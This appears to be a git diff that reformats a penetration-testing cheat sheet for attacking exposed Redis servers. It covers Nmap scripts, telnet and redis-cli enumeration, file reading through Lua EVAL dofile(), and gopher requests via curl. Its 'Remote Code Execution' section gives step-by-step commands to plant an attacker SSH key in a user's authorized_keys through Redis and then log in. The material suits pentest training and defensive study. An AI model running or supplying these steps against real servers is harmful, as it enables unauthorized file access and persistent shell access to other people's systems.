@@ -1,6 +1,7 @@
 # Redis Enumeration Tools
 
-### Nmap Enumeration
+## Nmap Enumeration
+
 ```
 $ ls -lh /usr/share/nmap/scripts | grep redis
 -rw-r--r-- 1 root root 2.8K Oct 12 09:29 redis-brute.nse
@@ -11,12 +12,14 @@ $ ls -lh /usr/share/nmap/scripts | grep redis
 $ nmap x.x.x.x -v -p 6379 --script=exampleScript1.nse,exampleScript2.nse
 ```
 
-### Manual Connnection
+## Manual Connnection
+
 ```
 $ telnet x.x.x.x 6379 
 ```
 
-### echo test
+## echo test
+
 ```
 $ telnet x.x.x.x 6379                                
 Trying x.x.x.x...
@@ -33,7 +36,8 @@ $6
 "test"
 ```
 
-### redis-cli
+## redis-cli
+
 ```shell
 > redis-cli -h x.x.x.x
 x.x.x.x:6379> info                                  
@@ -61,7 +65,7 @@ Other enumeration commands:
 `CONFIG GET dbfilename`
 `CONFIG GET logfile`
 
-### lua scripts
+## lua scripts
 
 Redis can execute sandboxed Lua scripts through the "EVAL" command. `dofile()` is a command that can be used to enumerate files and directories; in older Redis version it is allowed by the sandbox.
 
@@ -77,28 +81,35 @@ Examples:
 EVAL "dofile('/etc/issue')" 0
 (error) ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: '=' expected near '16.04' 
 ```
+
 and
+
 ```
 EVAL "dofile('/etc/lsb-release')" 0
 (error) ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu' 
 ```
+
 That gives us the info we're likely dealing with an ubuntu 16.04 machine. 
 
 You can also interact with redis with curl and gopher:
+
 ```
 # curl gopher://x.x.x.x:6379/_CONFIG%20GET%20dir --max-time 1
 ```
 
-### Remote Code Execution
+## Remote Code Execution
+
 Source: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
 
 Generate an ssh key:
+
 ```
 $ ssh-keygen -t rsa -C "crack@redis.io"
 $ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
 ```
 
 Connect to redis and find a user directory with .ssh directory:
+
 ```shell
 redis-cli -h x.x.x.x
 x.x.x.x:6379> EVAL "dofile('/home/')" 0
@@ -108,6 +119,7 @@ x.x.x.x:6379> EVAL "dofile('/home/user/.ssh')" 0
 ```
 
 Then write the authorized keys file and save:
+
 ```shell
 x.x.x.x:6379> config set dbfilename "authorized_keys"
 OK
@@ -116,6 +128,7 @@ OK
 ```
 
 Then connect via ssh:
+
 ```shell
 ssh -i id_rsa user@x.x.x.x
 ```
